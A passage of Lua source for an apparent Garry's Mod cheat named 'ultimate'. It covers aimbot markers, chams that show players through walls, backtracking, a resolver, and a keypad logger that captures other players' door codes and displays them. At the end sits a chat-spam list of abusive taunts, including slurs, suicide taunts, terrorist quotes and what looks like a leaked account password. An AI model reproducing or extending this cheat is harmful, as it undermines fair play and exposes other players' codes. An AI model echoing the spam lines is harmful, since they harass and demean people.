                local color = markerType == 2 and string_ToColor( ultimate.cfg.colors["GTA Marker"] ) or string.ToColor( ultimate.cfg.colors["Aimbot marker"] )

                if markerType == 2 then
                    draw.NoTexture()

                    local radius = ultimate.cfg.vars["GTA Marker Radius"] or 30
                    local size = ultimate.cfg.vars["GTA Marker Size"] or 10
                    local speed = ultimate.cfg.vars["GTA Marker Speed"] or 100
                    local angle_offset = (CurTime() * speed) % 360

                    for i = 0, 2 do
                        local angle = math.rad(angle_offset + i * 120)

                        local cx = pos.x + math.cos(angle) * radius
                        local cy = pos.y + math.sin(angle) * radius
                        local tip_angle = angle + math.pi

                        local function get_tri_points(sz)
                            local p1x = cx + math.cos(tip_angle) * sz
                            local p1y = cy + math.sin(tip_angle) * sz
                            local p2x = cx + math.cos(tip_angle + 2.3) * sz
                            local p2y = cy + math.sin(tip_angle + 2.3) * sz
                            local p3x = cx + math.cos(tip_angle - 2.3) * sz
                            local p3y = cy + math.sin(tip_angle - 2.3) * sz

                            return {
                                { x = p1x, y = p1y },
                                { x = p2x, y = p2y },
                                { x = p3x, y = p3y }
                            }
                        end

                        surface_SetDrawColor(0, 0, 0, color.a)
                        surface_DrawPoly(get_tri_points(size + 2))

                        surface_SetDrawColor(color.r, color.g, color.b, color.a)
                        surface_DrawPoly(get_tri_points(size))
                    end
                elseif markerType == 3 then
                    local radius = 4
                    surface.SetDrawColor(0, 0, 0, 255)
                    surface.DrawCircle(pos.x, pos.y, radius + 1)
                    local col = string.ToColor(ultimate.cfg.colors["Aimbot marker"])
                    surface.SetDrawColor(col.r, col.g, col.b, col.a)
                    surface.DrawCircle(pos.x, pos.y, radius)
                else
                    local gap = 2
                    local length = 4
                    local thickness = 1
                    local outline = 2
                    local function draw_marker_line(x1, y1, x2, y2, clr, thick, outline_thick)
                        surface.SetDrawColor(0, 0, 0, clr.a)
                        local full_thick = thick + outline_thick
                        for i = -full_thick, full_thick do
                            for j = -full_thick, full_thick do
                                surface.DrawLine(x1 + i, y1 + j, x2 + i, y2 + j)
                            end
                        end

                        surface.SetDrawColor(clr.r, clr.g, clr.b, clr.a)
                        for i = -thick, thick do
                            for j = -thick, thick do
                                surface.DrawLine(x1 + i, y1 + j, x2 + i, y2 + j)
                            end
                        end
                    end

                    draw_marker_line(pos.x - gap - length, pos.y - gap - length, pos.x - gap, pos.y - gap, color, thickness, outline)
                    draw_marker_line(pos.x + gap + length, pos.y - gap - length, pos.x + gap, pos.y - gap, color, thickness, outline)
                    draw_marker_line(pos.x - gap - length, pos.y + gap + length, pos.x - gap, pos.y + gap, color, thickness, outline)
                    draw_marker_line(pos.x + gap + length, pos.y + gap + length, pos.x + gap, pos.y + gap, color, thickness, outline)
                end
            end
        end


        

        surface.SetFont( "veranda" )

        if ultimate.cfg.vars[ "On screen logs" ] and table.Count( ultimate.onScreenLogs ) > 0 then
            local tick = engine.TickCount()
            local x, y = screenWidth / 2, screenHeight / 2 + 45

            for k, v in pairs( ultimate.onScreenLogs ) do

                if ultimate.TICKS_TO_TIME( tick - ultimate.onScreenLogs[ k ].tick ) > 8 then
                    ultimate.onScreenLogs[ k ] = nil
                    continue
                end

                local data = ultimate.onScreenLogs[ k ]
                local fstr = ""

                for o = 1, #data[ 1 ] do
                    fstr = fstr .. data[ 1 ][ o ]
                end

                local tw, th = surface.GetTextSize( fstr )

                x = x - tw / 2

                for p = 1, #data[ 1 ] do
                    local str = data[ 1 ][ p ]
                    tw, th = surface.GetTextSize( str )

                    surface.SetTextPos( x, y )
                    surface.SetTextColor( data[ 2 ][ p ] )
                    surface.DrawText( str )

                    x = x + tw
                end

                x, y = screenWidth / 2, y + th
            end
        end

        local plys = player.GetAll()

        if ultimate.cfg.vars["Spectator list"] then
            if not ultimate.spectatorListData then
                ultimate.spectatorListData = { x = screenWidth - 280, y = screenHeight / 2, dragging = false, dx = 0, dy = 0 }
            end

            local data = ultimate.spectatorListData
            local pLocalPlayer = LocalPlayer()
            local spectators = {}
            local headerColor = string_ToColor( ultimate.cfg.colors["Spectator list header"] )
            local accentColor = string_ToColor( ultimate.cfg.colors["Spectator list accent"] )
            local titleColor = string_ToColor( ultimate.cfg.colors["Spectator list title"] )
            local textColor = string_ToColor( ultimate.cfg.colors["Spectator list text"] )
            local targetColor = string_ToColor( ultimate.cfg.colors["Spectator list target"] )
            local listWidth = 280
            local headerHeight = 20

            for i = 1, #plys do
                local v = ultimate.playerCache[ plys[ i ] ]
                if not v then continue end
                if v.ObserverMode == 0 then continue end
                if not IsValid( v.entity ) then continue end
                if not IsValid( v.ObserverTarget ) then continue end

                spectators[ #spectators + 1 ] = {
                    text = ( v.entity:Name() or "Unknown" ) .. " spectating " .. tostring( v.ObserverTarget:Name() or "Unknown" ),
                    target = v.ObserverTarget == pLocalPlayer
                }
            end

            local rowHeight = 17
            local listHeight = headerHeight + 6 + math_max( #spectators, 0 ) * rowHeight
            local mx, my = gui.MousePos()
            local overList = mx >= data.x and mx <= data.x + listWidth and my >= data.y and my <= data.y + listHeight

            if overList and input.IsMouseDown(MOUSE_LEFT) and not data.dragging then
                data.dragging = true
                data.dx = mx - data.x
                data.dy = my - data.y
            end

            if data.dragging then
                if input.IsMouseDown(MOUSE_LEFT) then
                    data.x = math.Clamp( mx - data.dx, 0, screenWidth - listWidth )
                    data.y = math.Clamp( my - data.dy, 0, screenHeight - listHeight )
                else
                    data.dragging = false
                end
            end

            surface.SetFont( "veranda" )
            surface_SetDrawColor( accentColor.r, accentColor.g, accentColor.b, accentColor.a )
            surface_DrawRect( data.x, data.y - 3, listWidth, 3 )

            surface_SetDrawColor( headerColor.r, headerColor.g, headerColor.b, headerColor.a )
            surface_DrawRect( data.x, data.y, listWidth, headerHeight )

            local tw, th = surface_GetTextSize( "Spectator list" )
            surface_SetTextColor( 0, 0, 0, 255 )
            surface_SetTextPos( data.x + ( listWidth - tw ) / 2 + 1, data.y + ( headerHeight - th ) / 2 + 1 )
            surface_DrawText( "Spectator list" )

            surface_SetTextColor( titleColor.r, titleColor.g, titleColor.b, titleColor.a )
            surface_SetTextPos( data.x + ( listWidth - tw ) / 2, data.y + ( headerHeight - th ) / 2 )
            surface_DrawText( "Spectator list" )

            local y = data.y + headerHeight + 6
            if #spectators > 0 then
                for i = 1, #spectators do
                    local text = spectators[ i ].text
                    local clr = spectators[ i ].target and targetColor or textColor

                    surface_SetTextColor( 0, 0, 0, 255 )
                    surface_SetTextPos( data.x + 1, y + 1 )
                    surface_DrawText( text )

                    surface_SetTextColor( clr.r, clr.g, clr.b, clr.a )
                    surface_SetTextPos( data.x, y )
                    surface_DrawText( text )

                    y = y + rowHeight
                end
            end
        end

        if ultimate.cfg.vars["Crosshair"] then
            x = screenWidth * 0.5
            y = screenHeight * 0.5

            gap = 8
            size = 14

            local crosshairColor = ultimate.GetAnimatedColor( "Crosshair color", 120 )
            surface.SetDrawColor( crosshairColor.r, crosshairColor.g, crosshairColor.b, crosshairColor.a )

            surface.DrawLine(x - gap - size, y, x - gap, y)
            surface.DrawLine(x + gap, y, x + gap + size, y)

            surface.DrawLine(x, y - gap - size, x, y - gap)
            surface.DrawLine(x, y + gap, x, y + gap + size)
        end







    end



end


local function GetKeypads()
	return ents.FindByClass("Keypad")
end

hook.Add("Think", "KeypadLogger", function()
	if not ultimate.cfg.vars["Keypad Logger"] then return end
	local keypads = GetKeypads()
	for k, v in pairs(keypads) do
		if IsValid(v) then
			if v.hacked == nil then
				v.hacked = false
			end
			if not v.hacked then
				if v:GetStatus() == 1 then
					local text = v:GetText()
					if text and text != "****" and text != "" then
						v.hacked = true
						v.passi = text
					end
				end
			end
		end
	end
end)

hook.Add("HUDPaint", "KeypadLogger", function()
	if not ultimate.cfg.vars["Keypad Logger"] then return end
	if ultimate.UnSafeFrame then return end
	local keypads = GetKeypads()
	for k, v in pairs(keypads) do
		if IsValid(v) and v.hacked and v.passi then
			local pos = v:GetPos():ToScreen()
			if pos.x > 0 and pos.x < ScrW() and pos.y > 0 and pos.y < ScrH() then
				draw.SimpleText(v.passi, "TargetID", pos.x + 25, pos.y + 20, Color(255, 0, 0), 1, 1)
			end
		end
	end
end)


ultimate.kd = false
function ultimate.togglevisible()
    if ultimate.frame:IsVisible() then
        ultimate.frame:SetVisible(false)

        if ultimate.ui.MultiComboP then ultimate.ui.RemovePanel( ultimate.ui.MultiComboP ) end
        if ultimate.ui.ColorWindow then ultimate.ui.RemovePanel( ultimate.ui.ColorWindow ) end
        if ultimate.ui.SettingsPan then ultimate.ui.RemovePanel( ultimate.ui.SettingsPan ) end

        RememberCursorPosition()

        if ultimate.validsnd then ultimate.validsnd:Pause() end
    else
        ultimate.frame:SetVisible(true)

        RestoreCursorPosition()
        if ultimate.validsnd then ultimate.validsnd:Play() end
    end
end



function ultimate.PrePlayerDraw( pEntity, iFlags )
    if ( pEntity == pLocalPlayer ) then
        return
    end

   if ultimate.cfg.vars["Disable Taunts"] and ply != me then
        ply:AnimResetGestureSlot(GESTURE_SLOT_VCD)
        ply:AnimResetGestureSlot(GESTURE_SLOT_CUSTOM)
    
        ply:SetPoseParameter("head_pitch", 0)
        ply:SetPoseParameter("head_yaw", 0)
    end
  
    if ( ultimate.cfg.vars["Resolver"] ) then
        local angs = Angle()
        angs.y = ultimate.bruteYaw[ pEntity.aimshots % #ultimate.bruteYaw + 1 ] + pEntity:EyeAngles().y

        pEntity:SetRenderAngles( angs )
        pEntity:SetPoseParameter( "body_yaw", (angs.y + 180) / 360 )
        pEntity:SetPoseParameter( "aim_yaw", angs.y - pEntity:EyeAngles().y )
    end

    if ( ultimate.cfg.vars["Pitch resolver"] and pEntity.fakepitch ) then
        pEntity:SetPoseParameter( "aim_pitch", -89 )
        pEntity:SetPoseParameter( "head_pitch", -89 )
    end

    pEntity:InvalidateBoneCache()
    pEntity:SetupBones()

    pEntity.ChatGestureWeight = 0
end


// Chams

CreateMaterial("flat", "VertexLitGeneric")
CreateMaterial("flat_z", "VertexLitGeneric", {
    ["$ignorez"] = 1
} )

CreateMaterial( "selfillum", "VertexLitGeneric", {
    ["$basetexture"] = "vgui/white_additive",
    ["$bumpmap"] = "vgui/white_additive",
    ["$model"] = "1",
    ["$nocull"] = "0",
    ["$selfillum"] = 1,
    ["$selfIllumFresnel"] = 1,
    ["$selfIllumFresnelMinMaxExp"] = "[0.0 0.3 0.6]",
    ["$selfillumtint"] = "[0 0 0]",
} )

CreateMaterial( "selfillum_z", "VertexLitGeneric", {
    ["$basetexture"] = "vgui/white_additive",
    ["$bumpmap"] = "vgui/white_additive",
    ["$model"] = "1",
    ["$nocull"] = "0",
    ["$selfillum"] = 1,
    ["$selfIllumFresnel"] = 1,
    ["$selfIllumFresnelMinMaxExp"] = "[0.0 0.3 0.6]",
    ["$selfillumtint"] = "[0 0 0]",
    ["$ignorez"] = 1,
} )

CreateMaterial( "selfillum_a", "VertexLitGeneric", {
    ["$basetexture"] = "vgui/white_additive",
    ["$bumpmap"] = "vgui/white_additive",
    ["$model"] = "1",
    ["$nocull"] = "1",
    ["$nodecal"] = "1",
    ["$additive"] = "1",
    ["$selfillum"] = 1,
    ["$selfIllumFresnel"] = 1,
    ["$selfIllumFresnelMinMaxExp"] = "[0.0 0.3 0.6]",
    ["$selfillumtint"] = "[0 0 0]",
} )

CreateMaterial( "selfillum_a_z", "VertexLitGeneric", {
    ["$basetexture"] = "vgui/white_additive",
    ["$bumpmap"] = "vgui/white_additive",
    ["$model"] = "1",
    ["$nocull"] = "1",
    ["$nodecal"] = "1",
    ["$additive"] = "1",
    ["$selfillum"] = 1,
    ["$selfIllumFresnel"] = 1,
    ["$selfIllumFresnelMinMaxExp"] = "[0.0 0.3 0.6]",
    ["$selfillumtint"] = "[0 0 0]",
    ["$ignorez"] = 1,
} )

CreateMaterial("wireframe", "VertexLitGeneric", {
	["$wireframe"] = 1,
})
CreateMaterial("wireframe_z", "VertexLitGeneric", {
	["$wireframe"] = 1,
    ["$ignorez"] = 1,
})

CreateMaterial("metallic", "VertexLitGeneric", {
	["$envmap"] = "env_cubemap",
    ["$envmaptint"] = "[ 0 1 1 ]",
    ["$envmapfresnel"] = "1",
    ["$alpha"] = "0.5",
})

CreateMaterial("metallic_z", "VertexLitGeneric", {
    ["$envmap"] = "env_cubemap",
    ["$envmaptint"] = "[ 0 1 1 ]",
    ["$envmapfresnel"] = "1",
    ["$alpha"] = "0.5",
    ["$ignorez"] = 1,
})

ultimate.chamMats = {
    vis = {
        Material("!flat"), -- flat
        Material("!wireframe"), -- wireframe
        Material("!selfillum"), -- glow
        Material("!selfillum_a"), -- glow outline
        Material("!metallic"), -- metallic
        Material("effects/nightvision"), -- _rt_fullframefb
        Material("effects/flashbang"), -- _rt_fullframefb
    },
    invis = {
        Material("!flat_z"), -- flat
        Material("!wireframe_z"), -- wireframe
        Material("!selfillum_z"), -- glow
        Material("!selfillum_a_z"), -- glow outline
        Material("!metallic_z"), -- metallic
        Material("effects/nightvision"), -- _rt_fullframefb
        Material("effects/flashbang"), -- _rt_fullframefb
    }
}

do
    local f = (1/255)

    function ultimate.RenderScreenspaceEffects()
        if ultimate.UnSafeFrame then return end

        if ultimate.cfg.vars["Color Modify"] then
            local rse = {
                [ "$pp_colour_addr" ] = ultimate.cfg.vars["Color Modify Add Red"],
                [ "$pp_colour_addg" ] = ultimate.cfg.vars["Color Modify Add Green"],
                [ "$pp_colour_addb" ] = ultimate.cfg.vars["Color Modify Add Blue"],
                [ "$pp_colour_brightness" ] = ultimate.cfg.vars["Color Modify Brightness"],
                [ "$pp_colour_contrast" ] = ultimate.cfg.vars["Color Modify Contrast"],
                [ "$pp_colour_colour" ] = ultimate.cfg.vars["Color Modify Saturation"],
                [ "$pp_colour_mulr" ] = ultimate.cfg.vars["Color Modify Mul Red"],
                [ "$pp_colour_mulg" ] = ultimate.cfg.vars["Color Modify Mul Green"],
                [ "$pp_colour_mulb" ] = ultimate.cfg.vars["Color Modify Mul Blue"]
            }
            DrawColorModify( rse )
        end

        local vm, invm = ultimate.cfg.vars["Visible mat"], ultimate.cfg.vars["inVisible mat"]
        local sin = math.floor( math.sin( CurTime() * 4 ) * 45 )

        local vc = string.ToColor(ultimate.cfg.colors["Visible chams"])
        local invc = string.ToColor(ultimate.cfg.colors["inVisible chams"])
        local sc = string.ToColor(ultimate.cfg.colors["Self chams"])

        cam.Start3D()
            for k, v in pairs(player.GetAll()) do
                if not IsValid(v) or v == pLocalPlayer or not v:Alive() or v:IsDormant() then continue end

                if ultimate.cfg.vars["Supress lighting"] then
                    render.SuppressEngineLighting(true)
                end

                if ultimate.cfg.vars["inVisible chams"] then
                    ultimate.chamMats.invis[6]:SetVector( "$envmaptint", Vector( invc.r / 255, invc.g / 255, invc.b / 255 ) )
                    render.MaterialOverride(ultimate.chamMats.invis[invm])
                    render.SetColorModulation(invc.r/255,invc.g/255,invc.b/255)

                    if invm == 7 then
                        render.SetBlend( (sin + 100) / 255 )
                    end

                    v:SetRenderMode(1)
                    v:DrawModel()

                    if ultimate.cfg.vars["inVisible chams w"] then
                        local w = v:GetActiveWeapon()
                        if IsValid(w) then w:DrawModel() end
                    end
                end

                if ultimate.cfg.vars["Visible chams"] then
                    ultimate.chamMats.vis[6]:SetVector( "$envmaptint", Vector( vc.r / 255, vc.g / 255, vc.b / 255 ) )
                    render.MaterialOverride(ultimate.chamMats.vis[vm])
                    render.SetColorModulation(vc.r/255,vc.g/255,vc.b/255)

                    if vm == 7 then
                        render.SetBlend( (sin + 100) / 255 )
                    end

                    v:DrawModel()

                    if ultimate.cfg.vars["Visible chams w"] then
                        local w = v:GetActiveWeapon()
                        if IsValid(w) then w:DrawModel() end
                    end
                end

                if ultimate.cfg.vars["Supress lighting"] then
                    render.SuppressEngineLighting(false)
                end

            end

            if ultimate.cfg.vars["Self chams"] and IsValid(pLocalPlayer) and pLocalPlayer:Alive() then

                if ultimate.cfg.vars["Supress self lighting"] then
                    render.SuppressEngineLighting(true)
                end

                ultimate.chamMats.invis[6]:SetVector( "$envmaptint", Vector( sc.r / 255, sc.g / 255, sc.b / 255 ) )
                render.MaterialOverride(ultimate.chamMats.vis[ultimate.cfg.vars["Self mat"]])
                render.SetColorModulation(sc.r/255,sc.g/255,sc.b/255)

                if ultimate.cfg.vars["Self mat"] == 7 then
                    render.SetBlend( (sin + 100) / 255 )
                end

                pLocalPlayer:SetRenderMode(1)
                pLocalPlayer:DrawModel()

                if ultimate.cfg.vars["Self chams w"] then
                    local w = pLocalPlayer:GetActiveWeapon()
                    if IsValid(w) then w:DrawModel() end
                end

                if ultimate.cfg.vars["Supress self lighting"] then
                    render.SuppressEngineLighting(false)
                end

            end




        cam.End3D()

        render.SetColorModulation(1, 1, 1)
        render.SetBlend(1)
        render.MaterialOverride()
    end
end


// Client side models

function ultimate.CS_Model(mdl)
    local model = ClientsideModel(mdl)
	model:SetNoDraw(true)

    return model
end

function ultimate.CS_Model_update(ply,model,tbl)
    if !ply or !model or !tbl then return end

    local mdl = model
    local playerModel = ply:GetModel()
    local layers = tbl.layers

    for i = 0, 13 do
        if mdl:IsValidLayer(i) then
            local l = layers[i]
            mdl:SetLayerCycle(l.cycle)
            mdl:SetLayerSequence(l.sequence)
            mdl:SetLayerWeight(l.weight)
        end
    end

    mdl:SetSequence(tbl.sequence)
    mdl:SetCycle(tbl.cycle)

    mdl:SetPoseParameter("aim_pitch", tbl.angles.p)
	mdl:SetPoseParameter("head_pitch", 0)
	mdl:SetPoseParameter("body_yaw", tbl.angles.y)
	mdl:SetPoseParameter("aim_yaw", 0)

	mdl:SetPoseParameter("move_x", tbl.movex)
	mdl:SetPoseParameter("move_y", tbl.movey)

    mdl:SetAngles( Angle( 0, tbl.angles.y, 0 ) )
    mdl:SetModel( playerModel )
	mdl:SetPos( tbl.origin )
end

function ultimate.PostDrawTranslucentRenderables()
    if ultimate.UnSafeFrame then return end

    ultimate.drawCSModels_backtrack()
    ultimate.drawCSModels_real()

    render.SetBlend(1)
    render.MaterialOverride()
end


// Backtracking

ultimate.btrecords = {}
ultimate.predicted = {}

















function ultimate.canBacktrack(ply)
    if not ultimate.cfg.vars["Backtrack"] then return false end
    if not IsValid(ply) then return false end
    if not ultimate.btrecords[ply] then return false end
    if ply.break_lc then return false end

    return true
end

function ultimate.recordBacktrack(ply)
	local deadtime = CurTime() - ultimate.cfg.vars["Backtrack time"] / 1000

	local records = ultimate.btrecords[ply]

	if !records then
        records = {}
		ultimate.btrecords[ply] = records
	end

	local i = 1
	while i < #records do
		local record = records[i]

		if record.simulationtime < deadtime then
			table.remove(records, i)
			i = i - 1
		end

		i = i + 1
	end

	if !ply:Alive() then return end
    if ply.break_lc then return end

	local simulationtime = jopa.GetSimulationTime(ply)
	local len = #records
	local simtimechanged = true

	if len > 0 then
		simtimechanged = records[len].simulationtime < simulationtime
	end

	if !simtimechanged then return end

	local layers = {}
	for i = 0, 13 do
		if ply:IsValidLayer(i) then
			layers[i] = {
				cycle = ply:GetLayerCycle(i),
				sequence = ply:GetLayerSequence(i),
				weight = ply:GetLayerWeight(i)
			}
		end
	end

    local eyeAngles = ply:EyeAngles()
    local x,y = eyeAngles.x, eyeAngles.y

    local bdata = {}
    for i = 0, ply:GetBoneCount() - 1 do
        local v, a = ply:GetBonePosition( i )
        bdata[i] = { vec = v, ang = a }
    end

    local hdata = {}
    local hset = ply:GetHitboxSet()
    local hnum = ply:GetHitBoxCount( hset )

    for hitbox = 0, hnum - 1 do
        local bone = ply:GetHitBoxBone( hitbox, hset )

        if bone == nil then continue end

        local mins, maxs = ply:GetHitBoxBounds( bone, hset )

        if not mins or not maxs then continue end

        local bonepos, ang = ply:GetBonePosition( bone )
        mins:Rotate( ang )
        maxs:Rotate( ang )

        hdata[ #hdata + 1 ] = { pos = bonepos, mins = mins, maxs = maxs }
    end

    local skeletondata = {}

    /*
    for i = 0, ply:GetBoneCount() - 1 do

        local parent = ply:GetBoneParent(i)

        if(!parent) then continue end

        local bonepos = ply:GetBonePosition(i)

        if(bonepos == ply:GetPos() ) then continue end

        local parentpos = ply:GetBonePosition(parent)

        if(!bonepos or !parentpos) then continue end

        skeletondata[ 1 ] = bonepos:ToScreen()
        skeletondata[ 2 ] = parentpos:ToScreen()
    end
    */

	records[len + 1] = {
		simulationtime =    ultimate.ResolveSequence(ply),
		angles =            Angle(x,y,0),
		origin =            ply:GetNetworkOrigin(),
		aimpos =            ultimate.GetBones( ply )[1],
		sequence =          ply:GetSequence(),
		cycle =             ply:GetCycle(),
		layers =            layers,
        movex =             ply:GetPoseParameter("move_x"),
        movey =             ply:GetPoseParameter("move_y"),
        bonedata =          bdata,
        //hitboxdata =        hdata,
        //skeleton =          skeletondata
    }
end

ultimate.btmodel = ultimate.CS_Model("models/player/kleiner.mdl")

function ultimate.drawCSModels_backtrack()
    if not ultimate.cfg.vars["Backtrack chams"] then return end
    if not ultimate.canBacktrack(ultimate.target) then return end

    local len = #ultimate.btrecords[ultimate.target]
    local tbl = ultimate.btrecords[ultimate.target][ultimate.backtracktick]
    local m = ultimate.btmodel

    ultimate.CS_Model_update(ultimate.target,m,tbl)

    if ultimate.cfg.vars["Backtrack fullbright"] then
        render.SuppressEngineLighting(true)
    end

    local col = string.ToColor(ultimate.cfg.colors["Backtrack chams"])
    ultimate.chamMats.invis[6]:SetVector( "$envmaptint", Vector( col.r / 255, col.g / 255, col.b / 255 ) )
    render.MaterialOverride(ultimate.chamMats.invis[ultimate.cfg.vars["Backtrack material"]])
    render.SetColorModulation(col.r/255,col.g/255,col.b/255)
    m:SetRenderMode(1)
    m:DrawModel()

    if ultimate.cfg.vars["Backtrack fullbright"] then
        render.SuppressEngineLighting(false)
    end
end

ultimate.hitmarkers = {}
ultimate.hitnums = {}

gameevent.Listen( "player_hurt" )

function ultimate.player_hurt(data)
    local health = data.health
	local priority = SERVER and data.Priority or 5
	local hurted = Player( data.userid )
	local attackerid = data.attacker

	if attackerid == pLocalPlayer:UserID() then

        if ultimate.cfg.vars[ "On screen logs" ] then
            local hlcolor = string.ToColor( ultimate.cfg.colors[ "On screen logs" ] )
            local data = {
                tick = engine.TickCount(),
                {
                    "Hit ",
                    hurted:Name(),
                    " for ",
                    hurted:Health() - health,
                    " damage"
                },
                {
                    ultimate.HitLogsWhite,
                    hlcolor,
                    ultimate.HitLogsWhite,
                    hlcolor,
                    ultimate.HitLogsWhite,
                }
            }

            ultimate.onScreenLogs[ engine.TickCount() ] = data
            //print( "hurt", engine.TickCount() )
        end

        if ultimate.cfg.vars["Hitmarker"] then
            ultimate.hitmarkers[ #ultimate.hitmarkers + 1 ] = { time = CurTime(), add = 0 }
        end

        if ultimate.cfg.vars["Hitnumbers"] then
            local hp = hurted:Health() - health
            ultimate.hitnums[ #ultimate.hitnums + 1 ] = { time = CurTime(), add = 0, xdir = math.random(-1,1), ydir = math.random(-1,1), dmg = hp, crit = health <= 0 }
        end

        if ultimate.cfg.vars["Hitsound"] then
            surface.PlaySound( ultimate.cfg.vars["Hitsound str"] )
        end

        if ultimate.cfg.vars["Resolver"] then
            hurted.aimshots = (hurted.aimshots or 0) - 1
        end

    end
end

/*
    Player vars
*/

function ultimate.initPlayerVars( v )
    v.ult_prev_pos = Vector()

    v.ult_prev_simtime = 0
    v.flticks = 0
    v.aimshots = 0
    v.missedanimticks = 0

    v.break_lc = false
    v.simtime_updated = false
    v.fakepitch = false

    ultimate.btrecords[ v ] = {}
    ultimate.predicted[ v ] = {}
end

for k, v in ipairs(player.GetAll()) do
	ultimate.initPlayerVars( v )
end


ultimate.chatmsg =
{
        [1] = {
            "I am the way and the truth and the life. No one comes to the Father except through me. -Jesus",
            "Do to others as you would have them do to you. -Jesus",
            "With man this is impossible, but with God all things are possible. -Jesus",
            "Do not judge, or you too will be judged. -Jesus",
            "No one can serve two masters.You cannot serve both God and money. -Jesus",
            "And whoever wants to be first must be slave of all. -Jesus",
            "And whoever welcomes one such child in my name welcomes me. -Jesus",
            "For where your treasure is, there your heart will be also. -Jesus",
            "Greater love has no one than this: to lay down one’s life for one’s friends. -Jesus",
            "Whoever drinks the water I give them will never thirst. -Jesus",
            "That which does not kill us makes us stronger. -Friedrich Nietzsche",
            "In the middle of every difficulty lies opportunity. -Albert Einstein",
            "Don’t cry because it’s over, smile because it happened. -Dr Suess",
            "If you want something done right, do it yourself. -Charles-Guillaume Étienne",
            "The unexamined life is not worth living. -Socrates",
            "Better to have loved and lost, than to have never loved at all. -St Augustine",
            "An eye for an eye leaves the whole world blind. -Mahatma Gandhi",
            "In three words I can sum up everything I’ve learned about life: it goes on. -Robert Frost",
            "Necessity is the mother of invention. -Plato",
            "To err is human; to forgive, divine. -Alexander Pope",
            "Imagination is more important than knowledge. -Albert Einstein",
            "With great power comes great responsibility. -Voltaire",
            "Believe you can and you’re halfway there. -Theodore Roosevelt",
            "The pen is mightier than the sword. -Proverb",
            "Life is like a box of chocolates. You never know what you’re gonna get. -Forrest Gump’s Mom",
            "Familiarity breeds contempt. -Aesop",
            "It is always darkest just before the dawn. -Thomas Fuller",
            "The ballot is stronger than the bullet. -Lincoln",
            "If you are going through hell, keep going. -Winston Churchill",
            "I am not removing the debug library, calm down. -Rubat",
            "加里-纽曼（Garry Newman）请把我们从 rubat 拯救出来，他正在摆脱 debug.getregistry。-Lavrentiy Bandera",
            "Use ultimate™️, not exechack. -Jesus",
            "A rose by any other name would smell as sweet. -Juliet",
            "Don't cry because it's over, smile because it happened. -Dr. Seuss",
            "You miss 100% of the shots you don't take. -Wayne Gretzky",
            "Happiness is not something ready made. It comes from your own actions. -Dalai Lama",
            "My account details layo2021 - JNYLEQbgpiwv. -Donald Dicks $$$",
            "I WANT TO BE BANGED HARD. -Serejaga",
            "Um, I wonder if I am being hacked. -Ramzi",
            "Connections... no hackers. -Ramzi",
            "We love death. The U.S. loves life. That is the difference between us two. -Osama bin Laden",
            "I don't regret what happened there. -Osama bin Laden",
            "For God and country - Geronimo, Geronimo, Geronimo. -Osama bin Laden",
            "I support any Muslims, whether here or abroad. -Osama bin Laden",
            "An ounce of prevention is better than a pound of cure. -Osama bin Laden",
            "There is no dialogue except with weapons. -Osama bin Laden",
            "Russia does not have a great deal of experience building democratic institutions. -Putin",
            "Those who fight corruption should be clean themselves. -Putin",
            "The question isn't who is going to let me; it's who is going to stop me. -Putin",
            "There are no grounds to suggest that Russia will return to the Cold War. -Putin",
            "The 21st century will be defined by the fight against terrorism. -Putin",
            "Russia has never been surrounded by so many friends as it is today. -Putin",
            "Nobody should pin their hopes on a miracle. -Putin",
            "Russia is a country of free people who can ensure their prosperity and well-being. -Putin",
            "I believe in the people and the wisdom of our elites. -Putin",
            "In Russia, the state, in a proper sense, returned only recently. -Putin",
            "Why don't you make me a Double-expresso -- Macchiato -- with extra foam? -Bill Williamson",
            "Everyone's gotta live, everyone's gotta be happy - It's a joke. -Bill Williamson",
            "Buy a grandfather's penis and fuck everyone!",
            "All you need is Grandpa's penis! Trust me",
            "Buy a grandfather's penis and you can live not in a shoe box",
            "Grandfather's penis is the best solution",
            "Would you choose to be raped in prison or buy grandfather's penis?",
            "Do you have a small penis? It doesn't matter! Buy a grandfather's penis",
            "Tired of playing with a bad cheat? Buy grandfather's penis",
            "I want to sleep but can't get up from the table? There is a solution - GRANDFATHER'S PENIS!",
            "Tired of dying from grandfather's penis? Buy Grandfather's penis and kill everyone!",
        },
        [2] = {
            "1 нищий упал",
            "$$$ кешбек по зубам $$$",
            "╭∩╮( ⚆ ʖ ⚆)╭∩╮ ДоПрыГался(ت)ДрУжоЧеК",
            "·٠●•۩۞۩ОтДыХаЙ (ٿ) НуБяРа۩۞۩•●٠·",
            "але , а противники то где???",
            "ты по легиту играешь ?",
            "ебать ты красиво на бутылку присел , тебе дать альт ?",
            "пробил тикбазу головой твоей жирной матухи",
            "АХАХА ЕБАТЬ У ТЕБЯ ЧЕРЕПНАЯ КОРОБКА ПРЯМ КАК [XML-RPC] No-Spread 24/7 | aim_ag_texture_2 ONLY!",
            "на мыло и веревку то деньги есть????",
            "продам оффсеты на гмод цена 100 рублей российских",
            "Я прямо как Ильназ Галяиев",
            "Я муслим мне похуй на кризис мой пенис вырос",
            "Вот тебе паяльник , запаяй себе ебальник",
            "оттарабанен армянская королева",
            "сразу видно кфг иссуе мб конфиг у меня прикупишь ?",
            "Я твою маму дуже сильно поважаю , нехай береже її Степан Бендера",
            "Loading… ██████████ Lifehack.cfg Activated",
            "упавший на медию никогда не встанет с колен.",
            "Черные глаза Вспоминаю — умираю Черные глаза Я только о тебе мечтаю",
            "алло это скорая? тут такая ситуация парню который упал нужна скорая)",
            "Извини дорогая , не хотел на лицо",
            "прости что без смазки)",
            "лол ору ты прямо как 𓀐𓂸𓀐𓂸𓀐𓂸𓀐𓂸𓀐𓂸",
            "обе чернокожие головы превратились в кубики льда… Бере.",
            "Ало скорая тут такой случай шкiла упала в месорубку",
            "ты то куда лезешь сын фантомного стационарного спец изолированого металлформовочного механизма",
            "99 имен Аллаhа для детей",
            "у тебя член не конский не по масти эпик фейл",
            "гелим гелим гелим на валике",
            "Приходи один работёнка есть!, координаты: 55.8653382,49.304329",
            "юид полиция подьехала открывай дверь уебыч",
            "Disgusting tranny holzed",
            "але ты там из хрущевки выеди а потом вырыгивай блять",
            "как там с мамкой комнату разделять АХАХАХХАХА как ты на акк накопил блять",
            "найс 0.5х0.5м комната блять ХАХАХАХА ТЫ ТАМ ЖЕ ДАЖЕ ПОВЕСИТЬСЯ НЕ МОЖЕШЬ МЕСТА НЕТ ПХПХПХППХ",
            "на мыло и веревку то деньги есть нищ????",
            "опущены стяги, легион и.. А БЛЯТЬ ТЫЖ ТУТ ОПУЩ НАХУЙ ПХГАХААХАХАХАХА)))))))",
            "але какая с юидом ситуация)))",
